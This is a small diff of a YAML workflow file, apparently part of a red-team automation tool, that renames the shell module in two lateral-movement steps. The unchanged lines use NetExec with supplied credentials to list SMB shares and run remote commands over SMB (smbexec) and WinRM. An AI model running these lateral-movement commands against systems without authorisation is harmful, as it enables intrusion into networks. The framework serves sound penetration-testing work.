@@ -36,7 +36,7 @@ jobs:
     name: SMB Lateral Movement
     steps:
     - name: nxc-smb
-      module: shell
+      module: local.builtin.shell
       with:
         cmd: nxc smb {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
           }}" --shares --exec-method smbexec -x "whoami && ipconfig" 2>&1 | tee {{ env.OFX_RUN_DIR
@@ -47,7 +47,7 @@ jobs:
     name: WinRM Lateral Movement
     steps:
     - name: nxc-winrm
-      module: shell
+      module: local.builtin.shell
       with:
         cmd: nxc winrm {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
           }}" -x "whoami" 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_winrm_lateral.txt
